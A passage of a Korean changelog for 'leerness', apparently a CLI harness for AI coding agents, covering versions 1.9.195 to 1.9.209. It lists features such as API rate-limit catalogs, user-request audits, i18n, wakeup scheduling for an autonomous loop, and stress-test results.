- 헤드라인 14번째 요소: `🔍 pre-wake NC/MW (ageMin)` — critical N건 + warning M건
- 본문 자동 섹션: `## 🔍 직전 sleep pre-wake-audit (1.9.209, N분 전)`
  · critical/warning 최대 3개씩 노출
  · 4시간 이내 보고서만 (stale 자동 hide)
- 헤드라인 라벨: `1.9.81/93/113/152/162/192/197/204/207/209`

### 5. 누적 회귀 (1.9.200~208) — 모두 유지

### 6. stress-v154 — 18/18 PASS
- 1.9.209 (9) + 성능 (2) + 누적 회귀 (7)
- 격리 tmp dir 라이프사이클 검증 (실행 → 저장 → --last → rotate to 10)
- 6 findings kind 키워드 검증
- 성능: --version cold start avg 517ms · MCP 54 도구 574ms

### 7. 자동 release (71 라운드 main-push streak · 32 라운드 npm publish streak)

---

## 1.9.208 — 2026-05-22

**🚦 플랫폼/API 제약 사전 체크 (사용자 명시).**

### 사용자 명시
> *"사용자의 명령을 받으면, 고려해야하는 부분을 먼저 확인하고 진행하게 하면 어떨지 / 특정 플랫폼의 API ... 호출속도가 초당 5회 이하로만 해야한다는 규정을 먼저 확인"*

### 1. `.harness/platform-constraints.json` + 기본 catalog 6종
- **stripe** (rate: 100 req/s, idempotency key, webhook signing)
- **openai** (tier-based RPM, TPM, cost per 1M tokens)
- **anthropic** (claude tier, context-window, cost)
- **github** (5K req/hr auth, search 30 req/min, secondary)
- **discord** (50 req/s global, invalid ban)
- **twitter** (tier-based, OAuth 2.0 PKCE)
- 각 alias array 매칭 + docs URL 동봉

### 2. 헬퍼 함수
- `_loadPlatformConstraints(root)` — default merge user override
- `_writePlatformConstraints(root, catalog)` — 사용자 catalog 저장
- `_checkRequestConstraints(root, text)` — 텍스트 → 매칭 플랫폼 + 제약 + suggestions

### 3. `leerness constraints <list|check|add>` CLI
- `list` — 등록 catalog 출력 (--json)
- `check "<req>"` — 사용자 요청 매칭 → 제약 보고 (--json)
- `add <id> --alias name --constraint "kind:detail"` — 사용자 정의

### 4. review-request 자동 통합
- `_checkRequestConstraints()` review-request 내부에서 자동 호출
- JSON 출력에 `platformConstraints` + `constraintSuggestions` 필드 추가
- human 출력에 `## 🚦 플랫폼/API 제약 사전 체크` 섹션
- efficiencyHints 에 매칭 N건 알림

### 5. 누적 회귀 (1.9.200~207) — 모두 유지

### 6. stress-v153 — 18/18 PASS
- 1.9.208 (9) + 성능 (2) + 누적 회귀 (7)
- 기본 6 catalog + 사용자 정의 add + review-request 통합 검증
- 성능: --version cold start avg 483ms · MCP 54 도구 431ms

### 7. 자동 release (70 라운드 main-push streak · 31 라운드 npm publish streak)
- `release sync-main` 자동 → main merge + npm publish leerness@1.9.208

---

## 1.9.207 — 2026-05-22

**📥 사용자 요청 누락 확인 절차 MVP (사용자 명시).**

### 사용자 명시
> *"leerness가 적용된 프로젝트에서, 최근에 명령받아 진행한 것중에 누락된게 없는지 확인하는 절차도 있는지 확인해줘 / 다음 라운드시 참조"*

### 1. `.harness/user-requests.json` — 사용자 요청 누적 기록
- `_userRequestsPath/_loadUserRequests/_writeUserRequests` 파일 I/O 헬퍼
- `_recordUserRequest(root, text, opts)` — 자동 ID 부여(UR-XXXX) + 중복 방지(동일 텍스트 + open 상태)
- `_updateUserRequest(root, id, patch)` — status 전환 (open → in-progress → completed/dropped)
- 최근 200개 유지 (rotate)

### 2. `_auditUserRequests(root)` — 누락 후보 탐지
- open/in-progress 요청 텍스트의 첫 12 단어 추출 → task-log/plan/decisions 와 비교
- hits ≥ min(3, words×0.5) → **tracked** (어딘가 작업이 시작됨)
- 그 외 → **missing** (누락 후보, AI/사용자가 잊은 가능성)
- 7일+ open → **stale** (재검토 필요)

### 3. `leerness requests <sub>` CLI (사용자 명시 — "확인 절차")
- `audit` — missing/tracked/stale 보고 (--json 가능)
- `add "<text>"` — 사용자 요청 수동 기록
- `list [--status open|completed|dropped]` — 전체 출력
- `complete <UR-id>` / `drop <UR-id>` — 상태 전환

### 4. handoff 헤드라인 통합 (13번째 요소)
- missing ≥ 1 시: `📥 미답 요청 N건` (red)
- open > 0 (모두 tracked) 시: `📥 요청 N (tracked)` (green)
- 헤드라인 라벨: `1.9.81/93/113/152/162/192/197/204/207`

### 5. 누적 회귀 (1.9.200~206) — 모두 유지

### 6. stress-v152 — 17/17 PASS
- 1.9.207 (8) + 성능 (2) + 누적 회귀 (7)
- 사용자 요청 라이프사이클 격리 tmpdir 테스트 (add → list → audit → complete → drop)
- 중복 방지 확인
- 성능: --version cold start avg 2206ms · MCP 54 도구 1597ms

### 7. 자동 release (69 라운드 main-push streak · 30 라운드 npm publish streak)
- `release sync-main` 자동 → main merge + npm publish leerness@1.9.207
- 1.9.140부터 main 자동 push (69 라운드 무중단)
- 1.9.178부터 npm publish (30 라운드 무중단)

---

## 1.9.206 — 2026-05-22

**🌐 i18n MVP + UI/UX 헬퍼 (사용자 명시 2종).**

### 사용자 명시
> 1. *"설치 가이드에서 언어 선택에 따라 설치 가이드 및 REPL agent 모드 등 설정된 언어로 표시되어야"*
> 2. *"설치 가이드 및 REPL agent 모드 UI UX를 개선해줘, 모션이나, 텍스트 출력방식 등등"*

### 1. i18n 시스템 MVP (10 핵심 keys)
- `STRINGS` table (ko/en) — install.lang.* / install.agents.* / repl.welcome.* / common.*
- `_currentLang(root)` — `LEERNESS_LANG` env → `.harness/LANGUAGE` → 'ko' fallback
- `_t(key, lang)` — i18n lookup helper

### 2. 영어 선택 시 후속 prompt 자동 영어 표시
- 언어 선택 자체는 한국어 (사용자가 언어를 모르므로)
- 'en' 선택 시 `process.env.LEERNESS_LANG = 'en'` 즉시 설정 → agents prompt 등 자동 영어 변환

### 3. UI/UX 헬퍼 (`_typewrite`, `_ui`)
- `_typewrite(text, delayMs)` — opt-in via `LEERNESS_TYPEWRITER=1` (TTY 만)
- `_ui.bold/dim/cyan/green/yellow/hr` — 색상 + 구분선 표준화
- 비-TTY 환경 자동 fallback (plain text)

### 4. 누적 회귀 (1.9.200~205) — 모두 유지

### 5. stress-v151 — 16/16 PASS
- i18n (3) + UI helpers (1) + install 다국어 적용 (3) + 성능 (2) + 누적 (7)
- 성능: --version cold start avg **1049 ms** · MCP 54 도구 **768 ms**

### 6. MVP 노트 (확장 가능 설계)
- 현재: 10 핵심 keys (설치 가이드 + REPL welcome + common)
- 추후: REPL agent 모드 전체 메뉴 / handoff / resume 등 확장 가능 (점진적)

### 7. 자동 release
- main 자동 push **68 라운드 연속** (1.9.140~206)
- npm publish 자동 (1.9.178~)

---

## 1.9.205 — 2026-05-22

**⚡ ScheduleWakeup 사용자 요청 우선 갱신 (사용자 명시) — wakeup miss 실측 후속.**

### 사용자 명시 + 보고
> *"자동모드로 진행할때, 예정된 알람이전에 사용자 요청이 들어오면 백그라운드의 알람을 종료후 다시 갱신하는 방식은 어떤지"*
> *"ScheduleWakeup 10:51 KST 가 지났어"* — 사용자가 명시 보고한 wakeup miss 사례

### 1. `.harness/active-wakeups.json` 등록 추적
- release sync-main 마무리 시 다음 wakeup 자동 등록
- 구조: `{ expectedFireAt, intervalMin, source, status: pending/fired/missed/superseded, registeredAt }`
- 최근 20개 유지
- 함수: `_loadActiveWakeups` / `_writeActiveWakeups` / `_recordWakeup` / `_activeWakeupsPath`

### 2. handoff 진입 시 wakeup 상태 분석 (`_analyzeWakeupStatus`)
| kind | 조건 | 알림 |
|---|---|---|
| `early` | delta < -5min (미래) | `## ⚡ 사용자 조기 진입 감지` |
| `on-time` | -5 ~ +5min | `✓ ScheduleWakeup 정시 진입` |
| `late` | +5 ~ +30min | (조용히) |
| `missed` | > +30min | `## ⏰ ScheduleWakeup miss 확정` + status 자동 갱신 |

### 3. 조기 진입 시 자동 갱신 가이드
사용자가 wakeup 예정 시각 이전 진입 → "라운드 마무리 시 새 wakeup 등록 (이전 자동 superseded)" 안내

### 4. miss 자동 status 갱신
fire 시간 지남 + 30분 이상 → status `pending` → `missed` 자동 업데이트 → 통계 누적

### 5. 누적 회귀 (1.9.199~204) — 모두 유지

### 6. stress-v150 — 16/16 PASS
- 등록 추적 (3) + 상태 분석 (2) + 임시 워크스페이스 통합 (2) + 성능 (2) + 누적 (7)
- 성능: --version cold start avg **464 ms** · MCP 54 도구 **460 ms**

### 7. 자동 release
- main 자동 push **67 라운드 연속** (1.9.140~205)
- npm publish 자동 (1.9.178~)

---

## 1.9.204 — 2026-05-22

**⏰ timezone 보강 + 🔄 auto-loop 활성 라벨 (사용자 명시 2종).**

### 사용자 명시
> 1. *"시간관련 기능 등은 해당 국가의 시간대를 고려해서 작업이 될 수 있는지"*
> 2. *"자동으로 깨어나서 작업하는 모드도 활성룰에 표시되어야 할 것 같은데, 활성 룰 에 표시되는 기능 점검"*

### 1. timezone 시스템 (Intl.DateTimeFormat 기반, 의존성 0)
- `_getLocalTz()` — `process.env.LEERNESS_TZ` → 시스템 timezone → `Asia/Seoul` fallback
- `_formatLocal(iso, opts)` — ISO UTC → 사용자 local time (예: `2026-05-22 10:13 KST`)
- 단축 라벨: KST / JST / UTC / 자동 추출
- **저장은 UTC ISO 유지** (이식성/일관성), **display 만 local time 변환**

### 2. resume CLI local time 표시
```
$ leerness resume
  📅 plan 저장: 2026-05-22 09:48 KST  (29분 전)
  ⏰ 예상 fire: 2026-05-22 10:13 KST  (정시)
```
이전: `2026-05-22T00:48:23.298Z` (한국 사용자 +9 머릿속 변환 필요)
이후: `2026-05-22 09:48 KST` (즉시 인지 가능)

### 3. 자동 모드 활성 라벨 (헤드라인 12번째)
```
📊 헤드라인 (1.9.81/93/113/152/162/192/197/204): ... · 🔄 auto-loop 25min · ...
```
- `_getAutoLoopRule(root)` — `R-XXXX [every-round]` 활성 룰 자동 감지
- 룰 텍스트에서 `25분` 또는 `1500초` 패턴 추출 → 분 단위 표시

### 4. 누적 회귀 (1.9.198~203) — 모두 유지

### 5. stress-v149 — 16/16 PASS
- timezone (3) + resume display (1) + headline label (2) + 실 검증 (1) + 성능 (2) + 누적 (7)
- 성능: --version cold start avg **471 ms** · MCP 54 도구 **438 ms**

### 6. 자동 release 흐름
- main 자동 push **66 라운드 연속** (1.9.140~204)
- npm publish 자동 (1.9.178~)

---

## 1.9.203 — 2026-05-22

**📋 자동 라운드 plan 자동 정리 + `leerness resume` 신규 CLI (사용자 명시).**

### 사용자 명시
> *"자동모드는 백그라운드에 다음 작업이 시작가능한 예상 시간을 설정해서 백그라운드에서 알람 트리거 같은걸 구현하고 일어났을때 해야하는 일을 정리해서 또 진행하고 반복으로 하는건 어떨까"*

### 1. `.harness/auto-resume-plan.json` 자동 저장
- 라운드 마무리 (release sync-main 시 npm publish 완료 후) **자동 저장**
- plan 구조:
  - `savedAt`, `nextRoundVersion`, `expectedFireAt`, `intervalMin`
  - `focus` (자유 텍스트)
  - `contextSnapshot` (currentVersion, activeTaskId, activeTaskRequest, memorySurface, r0001Rule)
  - `nextActions` (1.9.201 next-action-queue snapshot)
- 함수: `_loadAutoResumePlan` / `_writeAutoResumePlan` / `_buildAutoResumePlan` / `_autoResumePlanPath`

### 2. `leerness resume` 신규 CLI
일어났을 때 즉시 무엇부터 할지 한눈에:
```
$ leerness resume
# 🔄 leerness resume (1.9.203 자동 라운드 plan 적용)
  📅 plan 저장: 2026-05-22T00:10:10.797Z  (15분 전)
  ⏰ 예상 fire: 2026-05-22T00:35:10.797Z  (정시)
  🎯 focus: 다음 라운드: handoff → next-action take → 사용자 명시 또는 5축 매트릭스 보강

## 다음 라운드: next after 1.9.203
  현재 버전: 1.9.203
  활성 task: T-9999 — ...
  memory: T2/D15/R1/L3
  룰: 25분 간격 (사용자 명시, R-0001)

## 사전 정리된 next-actions (3건)
  🛡 lessons.md "X" 관련 ...
     `leerness lessons --auto --path .`
  ...
  → 즉시 task 추가: leerness next-action take

✓ resume 준비 완료 — 권장: leerness handoff . 또는 leerness next-action take
```
- `--json` 옵션 (자동화/MCP)

### 3. handoff 자동 plan 알림
handoff 진입 시 plan 존재 시 자동 노출:
```
## 📋 auto-resume-plan 로드 (1.9.203) — 15분 전 저장 (정시)
  🎯 focus: 다음 라운드: ...
  📦 다음 버전: next after 1.9.203
  📥 사전 정리된 actions: 3건 → leerness next-action take
  → 상세: leerness resume
```
끄기: `LEERNESS_NO_RESUME_PLAN=1`

### 4. 자율 모드 cycle 완성
- 라운드 마무리 → plan 자동 저장 → ScheduleWakeup 25분 → wakeup → handoff plan 자동 로드 → resume / next-action take → 즉시 진입

### 5. 누적 회귀 (1.9.197~202) — 모두 유지

### 6. stress-v148 — 17/17 PASS
- auto-resume-plan 5 + resume CLI 3 + handoff 통합 + 성능 2 + 누적 회귀 7
- 성능: --version cold start avg **464 ms** · MCP 54 도구 **449 ms**

### 7. 자동 release 흐름
- main 자동 push **65 라운드 연속** (1.9.140~203)
- npm publish 자동 (1.9.178~)

---

## 1.9.202 — 2026-05-22

**🌐 C축 (공식 표준 스킬 자동 활용) 9.0/10 → 9.5/10 보강 — matched skill 설치 상태 표시 + leerness skill install-top.**

자율 모드 132 라운드. 100% 매트릭스 도전 — C축 마지막 0.5 보강 (97 → 97.5).

### 1. install 이력 기록 + 설치 상태 표시
- `.harness/skill-installed-log.json` (비시크릿, 체크인 가능)
- 함수: `_loadSkillInstalledLog` / `_appendSkillInstalledLog` / `_isSkillInstalled`
- handoff matched entry 에 `✓ 설치됨` 또는 `🆕` 태그 자동 표시

### 2. `leerness skill install-top` 신규 CLI
- handoff 컨텍스트 (in-progress task) 의 keyword 로 official skill 매칭
- top 1 (이미 설치된 것 자동 skip) 즉시 download + install
- 설치 후 자동 이력 기록 → 중복 install 방지
- `--force`: 이미 설치된 것 강제 재설치

### 3. handoff body 통합
```
## 🌐 공식 organization 스킬 자동 매칭 (1.9.192/193) — 키워드 "X"
   ✓ 설치됨 [vercel] skill-A — ...
   🆕 [anthropic] skill-B — ...
   → 1개 즉시: leerness skill install-top  (1.9.202)
   → 전체 설치: leerness skill auto-install --yes
```

### 4. 누적 회귀 (1.9.196~201) — 모두 유지

### 5. stress-v147 — 15/15 PASS
- 설치 이력 (6) + 성능 (2) + 누적 회귀 (7)
- 성능: --version cold start avg **457 ms** · MCP 54 도구 **468 ms**

### 6. 5축 매트릭스
| 축 | 1.9.201 | 1.9.202 | 상태 |
|---|---|---|---|
| C. 공식 표준 스킬 자동 활용 | 9.0 | **9.5** | +0.5 (설치 상태 + install-top) |
| **종합** | 48.5/50 (97%) | **49/50 (98%)** | **+1%** |

### 7. 자동 release
- main 자동 push **64 라운드 연속** (1.9.140~202)
- npm publish 자동 (1.9.178~)

---

## 1.9.201 — 2026-05-22

**🎯 E축 (게으름 방지) 9.5/10 → 10/10 보강 — next-action queue + leerness next-action take 명령.**

자율 모드 131 라운드. 200 마일스톤 후속 — 100% 매트릭스를 향한 다음 단계.

### 사용자 의도 정렬 (1.9.191 verbatim)
> *"게으름 방지등등 최고의 도구"*

### 1. handoff next-action 자동 큐잉 (E축 핵심)
- `_suggestNextActions` (1.9.194) 가 제안한 항목을 `.harness/next-action-queue.json` 에 자동 저장
- 중복 방지 (이미 있는 title skip), 최근 20개만 유지
- 함수: `_enqueueNextActions(root, actions)` / `_loadNextActionQueue(root)` / `_writeNextActionQueue(root, queue)`

### 2. `leerness next-action` 신규 CLI
- `next-action list [--json]` — 큐 전체 (default sub)
- `next-action take [N]` — 큐에서 가져와서 `leerness task add` 자동 호출 (N 생략 시 최신)
- `next-action add "<text>"` — 수동 추가
- `next-action clear` — 큐 초기화

### 3. 1-step 게으름 방지 흐름
```
$ leerness handoff .
  ## 🎯 다음 단계 자동 제안 (1.9.194 E축) — 키워드 "X"
    🛡 과거 실패 회피 — lessons.md "X" 관련 N건
       `leerness lessons --auto --path .`
    → 즉시 task add: leerness next-action take  (큐 +1건 저장됨, 1.9.201)

$ leerness next-action take
  ✓ task 추가: T-0042 — "과거 실패 회피 — lessons.md..."
  💡 실행 명령: leerness lessons --auto --path .
```

### 4. 누적 회귀 (1.9.195~200) — 모두 유지

### 5. stress-v146 — 16/16 PASS
- next-action CLI (7) + 임시 워크스페이스 통합 (1) + 성능 (2) + 누적 회귀 (7)
- 성능: --version cold start avg **436 ms** · MCP 54 도구 **442 ms**

### 6. 5축 매트릭스 변동
| 축 | 1.9.200 | 1.9.201 | Δ |
|---|---|---|---|
| E. 게으름 방지 | 9.5/10 | **10/10** ✓ | +0.5 (next-action 1-step 자동 task add) |
| **종합** | 48/50 (96%) | **48.5/50 (97%)** | +1% |

### 7. 5축 모두 9 이상 + 3축 10/10
- A 10/10 ✓ (1.9.197)
- D 10/10 ✓ (1.9.196)
- E 10/10 ✓ (1.9.201) — 신규
- B 9.5/10 (1.9.198)
- C 9.0/10 (1.9.192)

### 8. 자동 release 흐름
- main 자동 push **63 라운드 연속** (1.9.140~201)
- npm publish 자동 (1.9.178~)

---

## 1.9.200 — 2026-05-22

**🎉 200 마일스톤 — 60 라운드 자율 누적 + 5축 매트릭스 96/100.**

### 누적 성과
- **62 라운드 연속** main 자동 push (1.9.140~200)
- **23 라운드 연속** 자동 npm publish (1.9.178~200)
- **8 라운드 연속** 5축 매트릭스 보강 (1.9.192~199): **88% → 96%**
- 사용자 명시 7건 모두 즉시 대응

### 5축 매트릭스 (1.9.191 → 1.9.200)
| 축 | 시작 | 현재 | Δ |
|---|---|---|---|
| A. 범용 AI 하네스 | 9.0 | **10.0** ✓ | +1.0 |
| B. 멀티 Sub-Agent 오케스트라 | 8.5 | **9.5** | +1.0 |
| C. 공식 표준 스킬 자동 활용 | 8.0 | **9.0** | +1.0 |
| D. 장기 맥락 유지 | 9.5 | **10.0** ✓ | +0.5 |
| E. 게으름 방지 | 9.0 | **9.5** | +0.5 |
| **종합** | **44/50 (88%)** | **48/50 (96%)** | **+8%** |

### 마일스톤 보고서
- `_reports/milestone-1.9.200-60-rounds.md` (비공개)
- 60 라운드 진척표, 핵심 마일스톤 8건, 사용자 명시 대응 7건, 향후 방향

### 신규 기능 (1.9.192~199) 요약
1. **1.9.192**: 공식 catalog 자동 노출 + 24h 캐시 (C축 시작)
2. **1.9.193**: agents multi consensus → lessons.md 자동
3. **1.9.194**: handoff next-actions 7 휴리스틱 + 24h+ lazy
4. **1.9.195**: provider universal probe (13 backend)
5. **1.9.196**: 7일+/30일+ recall + ScheduleWakeup miss detector
6. **1.9.197**: provider probe handoff 자동 통합 (60분 캐시)
7. **1.9.198**: multi-agent consensus 이력 → best agent 추천
8. **1.9.199**: last-handoff 정밀 측정 + R-0001 강한 알림

### stress-v145 — 13/13 PASS
- 마일스톤 보고서 검증 4 + 성능 2 + 누적 회귀 7
- 성능: --version cold start avg **1022 ms** · MCP 54 도구 **789 ms**

### 자동 release 흐름
- main 자동 push **62 라운드 연속** (1.9.140~200)
- npm publish 자동 (1.9.178~)

---

## 1.9.199 — 2026-05-21

**⏰ wakeup miss 자동 회복 강화 — last-handoff timestamp 정밀 측정 + R-0001 룰 (25분) 대비 강한 알림.**

자율 모드 129 라운드. 사용자 보고 "22:01에 라운드에 자동진입되지않았어" 대응.

### 1. last-handoff timestamp 기록 (`.harness/last-handoff.json`)
- handoff 진입 시 자동 기록 — `last` + `history` (최근 10개)
- 함수: `_recordLastHandoff(root)` / `_getLastHandoffGap(root)` / `_lastHandoffPath(root)`
- 기록 순서: 1) 이전 timestamp 보존 → 2) 현재 timestamp 기록 → 3) 보존된 값으로 gap 측정

### 2. 강한 의심 알림 (1.9.196 task-log 기반 → 1.9.199 정밀)
**R-0001 영구 룰 (25분) 대비:**
- gap > 60분 → 🔴 강한 의심 ("시스템 sleep / wakeup 누락 확실")
- gap 35~60분 → ⚠ 의심 ("buffer 초과, 한 cycle 누락 가능성")
- gap ≤ 30분 + history ≥ 2 → ✓ 정상

```
## ⏰ ScheduleWakeup miss 강한 의심 (1.9.199) — 이전 handoff 90분 전
  R-0001 영구 룰 (25분) 대비 3× 초과 — 시스템 sleep / wakeup 누락 확실
  → 회복: 사용자가 "다음 라운드" 입력 또는 leerness rule list 로 룰 확인
  → handoff 이력: 09:30:21 → 10:55:14 → 12:25:33
```

### 3. 누적 회귀 (1.9.193~198) — 모두 유지

### 4. stress-v144 — 16/16 PASS
- last-handoff 측정 (5) + 임시 워크스페이스 통합 (2) + 성능 (2) + 누적 회귀 (7)
- 성능: --version cold start avg **1065 ms** · MCP 54 도구 **717 ms**

### 5. 다층 redundancy (사용자 보고 대응)
세션 내 활성 cron jobs:
- `3f617fbc` — Every 25 minutes (R-0001 sync)
- `33a4ed9f` — 3,28,53 * * * * (offset backup)
- ScheduleWakeup 1500s primary

### 6. 자동 release 흐름
- main 자동 push **61 라운드 연속** (1.9.140~199)
- npm publish 자동 (1.9.178~)

---

## 1.9.198 — 2026-05-21

**🤖 B축 9/10 → 9.5/10 — handoff multi-agent consensus 이력 기반 best agent 자동 추천.**

자율 모드 128 라운드. 1.9.193 consensus 자동 lessons.md 저장 (B축) 후속 — 저장한 데이터를 **handoff 에서 즉시 재활용**.

### 사용자 의도 정렬 (1.9.191 verbatim)
> *"멀티 서브 에이전트 오케스트라 ... 최고의 도구"*

### 1. handoff 신규 섹션 (B축 핵심)
```
## 🤖 task 매칭 best agent (1.9.198 B축) — 키워드 "authentication"
  과거 multi-agent consensus 2건 — 추천 agent: claude (1회 best)
  최근 hit: 2026-05-20 agent=claude score=0.873
  → 재실행: leerness agents multi "<task>" --execute
```
- lessons.md 의 1.9.193 `multi-agent consensus — best=X (1.9.193)` 패턴 자동 추출
- keyword fuzzy 매칭으로 관련 hits 선별
- agent 별 빈도 카운트 → 최다 best agent 자동 노출
- 끄기: `--no-multiagent-hint` 또는 `LEERNESS_NO_MULTIAGENT_HINT=1`

### 2. 신규 함수
- `_loadMultiAgentConsensusHistory(root, keyword)` — lessons.md 1.9.193 패턴 추출 + fuzzy 매칭

### 3. 누적 회귀 (1.9.192~197) — 모두 유지
- [1.9.197] _readyBackendCountFromCache (60분 캐시 + 헤드라인)
- [1.9.196] D축 7일+/30일+ recall + ScheduleWakeup miss detector
- [1.9.195] _probeProviderEndpoints (provider universal probe)
- [1.9.194] _suggestNextActions (handoff next-actions)
- [1.9.193] agents multi consensus → lessons.md
- [1.9.192] _loadOfficialSkillCache + 24h 캐시

### 4. stress-v143 — 14/14 PASS
- B축 보강 (5: 함수 + 섹션 + 임시 워크스페이스 통합 검증 + 빈도 카운트)
- 성능: --version cold start avg **500 ms** · MCP 54 도구 **494 ms**

### 5. 5축 매트릭스 변동
| 축 | 1.9.197 | 1.9.198 | Δ |
|---|---|---|---|
| B. 멀티 Sub-Agent 오케스트라 | 9/10 | **9.5/10** | +0.5 (consensus 이력 자동 회수) |
| 종합 | 47.5/50 (95%) | **48/50 (96%)** | +1% |

### 6. 사용자 명시 조치
- Cron `10dcaa07` (hourly :17 backup) 사용자 요청으로 삭제
- 자동 루프는 **ScheduleWakeup 1500s (25분, R-0001 영구 룰)** 단독 운영

### 7. 자동 release 흐름
- main 자동 push **60 라운드 연속** (1.9.140~198)
- npm publish 자동 (1.9.178~)

---

## 1.9.197 — 2026-05-21

**🔌 A축 9.5/10 → 10/10 — provider probe handoff 자동 통합 + 60분 캐시. 5축 매트릭스 47.5/50 (95%).**

자율 모드 127 라운드. 1.9.196 D축 완성에 이어 **A축 9.5 → 10/10** 마지막 보강.

### 사용자 의도 정렬 (1.9.191 verbatim)
> *"범용 AI 하네스 ... 최고의 도구"*

### 1. handoff 헤드라인 11번째 요소 (1.9.197 신규)
```
📊 헤드라인 (1.9.81/93/113/152/162/192/197): ... · 🔌 backend 3/13 (0h✓)
```
- `🔌 backend {ready}/{total} ({age}{status})`
- 13 후보 = CLI 5 + Local endpoint 3 + Cloud API key 5
- 60분 캐시 hit 시 즉시 표시 (network 부하 X)
- 캐시 만료 시 `⚠` 표시 → 사용자/AI 가 `provider probe` 재실행 인지

### 2. 60분 TTL 캐시 (1.9.197 신규)
- 파일: `.harness/provider-probe-cache.json` (비시크릿, 체크인 가능)
- `_PROVIDER_PROBE_CACHE_TTL_MS = 60 * 60 * 1000`
- `provider probe` 실행 시 자동 저장 (`--no-cache` 로 끄기)
- 함수: `_loadProviderProbeCache` / `_writeProviderProbeCache` / `_readyBackendCountFromCache`

### 3. 누적 회귀 (1.9.191~196) — 모두 유지
- [1.9.196] D축 7일+/30일+ recall + ScheduleWakeup miss detector
- [1.9.195] _probeProviderEndpoints (provider universal probe)
- [1.9.194] _suggestNextActions (handoff next-actions)
- [1.9.193] agents multi consensus → lessons.md
- [1.9.192] _loadOfficialSkillCache + 24h 캐시
- [1.9.191] 구조 최적화 보고서 88/100

### 4. stress-v142 — 15/15 PASS
- A축 9.5→10 보강 (6: 함수 + 캐시 자동 저장 + 헤드라인 11번째 + handoff 통합 검증)
- 성능: --version cold start avg **506 ms** · MCP 54 도구 **591 ms**

### 5. 5축 매트릭스 (모든 축 보강 완료)
| 축 | 1.9.191 | 1.9.197 | Δ |
|---|---|---|---|
| A. 범용 AI 하네스 | 9 | **10** | +1 (probe + handoff 자동) |
| B. 멀티 Sub-Agent | 8.5 | **9** | +0.5 (consensus lessons) |
| C. 공식 스킬 자동 | 8 | **9** | +1 (official catalog handoff) |
| D. 장기 맥락 유지 | 9.5 | **10** | +0.5 (7일+/30일+ recall) |
| E. 게으름 방지 | 9 | **9.5** | +0.5 (next-actions) |
| **종합** | **44/50 (88%)** | **47.5/50 (95%)** | **+7%** 🎯 |

### 6. 자동 release 흐름
- main 자동 push **59 라운드 연속** (1.9.140~197)
- npm publish 자동 (1.9.178~)

---

## 1.9.196 — 2026-05-21

**🗄 D축 (장기 맥락 유지) 보강 — 7일+ 장기 정체 + 30일+ lessons 회고 + ScheduleWakeup miss detector.**

자율 모드 126 라운드. 사용자 명시:
> *"다음 라운드 진행하고, ScheduleWakeup 가 정상적으로 작동하도록 조취를 취해줘"*

5축 매트릭스 마지막 미보강 축인 **D축 (9.5/10 → 목표 10/10)** + 사용자 명시 ScheduleWakeup 안정화.

### 1. D축 핵심 — 장기 정체 + 30일+ 회고 (handoff 자동)
**7일+ critical 단계** (24h+ lazy 다음 단계):
```
## ⚠ 진척 정체 감지 (1.9.194 E축) — progress-tracker 마지막 변동 8d 전
   ...
   🔴 7일+ 장기 정체 (8d) — 장기 맥락 손실 위험 (1.9.196 D축)
     → 즉시 회고: leerness retro . --since 8d
     → 또는 archive: leerness task drop T-XXXX
```

**30일+ 장기 lessons 회고** (long-term memory recall):
- handoff keyword 매칭 + lessons.md 30일+ 전 블록
- 새 섹션: `## 🗄 장기 lessons 회고 (1.9.196 D축) — 키워드 "X" 관련 30일+ N건`
- 잊혀진 과거 교훈 자동 재상기 → 같은 실수 반복 방지
- 끄기: `--no-longterm-recall` / `LEERNESS_NO_LONGTERM_RECALL=1`

### 2. ScheduleWakeup 안정화 (사용자 명시) — 다층 redundancy
**Layer 1**: 더 짧은 ScheduleWakeup (1.9.193부터 900s → **270s** — 5분 cache 안에 유지)
**Layer 2**: CronCreate every 13min (durable: false) — primary 누락 시 backup
**Layer 3**: handoff에 wakeup miss detector — 60분+ 무 활동 시 알림
```
## ⏰ ScheduleWakeup miss 의심 (1.9.196) — 마지막 활동 90분 전
   자율 모드 정상 cycle: ~15분. 60분 이상 무 활동 → 시스템 sleep 또는 wakeup 누락
   → 재개: 사용자가 "다음 라운드" 또는 "/loop" 입력
```
끄기: `LEERNESS_NO_WAKEUP_MISS=1`

### 3. 누적 회귀 (1.9.190~195) — 모두 유지
- [1.9.195] _probeProviderEndpoints (provider universal probe)
- [1.9.194] _suggestNextActions (handoff next-actions)
- [1.9.193] agents multi consensus → lessons.md
- [1.9.192] _loadOfficialSkillCache + 24h 캐시
- [1.9.191] 구조 최적화 보고서 88/100
- [1.9.190] _selectOne/_selectMany Ctrl+C 즉시 종료

### 4. stress-v141 — 15/15 PASS
- D축 보강 (6: 함수 + 7일+ + 30일+ + miss detector + 임시 워크스페이스 통합) + 성능 (2) + 누적 회귀 (7)
- 성능: --version cold start avg **709 ms** · MCP 54 도구 **534 ms**

### 5. 5축 매트릭스 변동
| 축 | 1.9.195 | 1.9.196 | Δ |
|---|---|---|---|
| D. 장기 맥락 유지 | 9.5/10 | **10/10** | +0.5 (7일+ critical + 30일+ recall + miss detector) |
| 종합 | 46.5/50 (93%) | **47/50 (94%)** | +1% |

### 6. 5축 모든 보강 완료
| 축 | 시작 | 현재 | Δ |
|---|---|---|---|
| A. 범용 AI 하네스 | 9 | **9.5** | +0.5 (1.9.195 probe) |
| B. 멀티 Sub-Agent | 8.5 | **9** | +0.5 (1.9.193 consensus lessons) |
| C. 공식 스킬 자동 | 8 | **9** | +1 (1.9.192 official catalog) |
| D. 장기 맥락 유지 | 9.5 | **10** | +0.5 (1.9.196 7일+/30일+ recall) |
| E. 게으름 방지 | 9 | **9.5** | +0.5 (1.9.194 next-actions) |
| **종합** | 44/50 (88%) | **47/50 (94%)** | **+6%** |

### 7. 자동 release 흐름
- main 자동 push **58 라운드 연속** (1.9.140~196)
- npm publish 자동 (1.9.178~)

---

## 1.9.195 — 2026-05-21

**🌐 A축 (범용 AI 하네스) 보강 — `leerness provider probe` 신규 명령 (CLI/endpoint/API 키 3종 자동 감지).**

자율 모드 125 라운드. 1.9.192 C / 193 B / 194 E 보강에 이어 **A축 (9/10 → 목표 9.5/10)** 보강.

### 사용자 의도 정렬 (1.9.191 verbatim)
> *"범용 AI 하네스 ... 최고의 도구"*

### 1. `leerness provider probe` 신규 명령 (A축 핵심)
- **3종 자동 감지** (의존성 0 — Node built-in cp + http):
  1. **CLI binaries**: claude / codex / gemini / copilot / ollama (PATH + `--version`)
  2. **Local endpoint**: Ollama (11434) / LM Studio (1234) / llama.cpp (8080)
  3. **Cloud API key**: OPENROUTER / GROQ / TOGETHER / ANTHROPIC / OPENAI

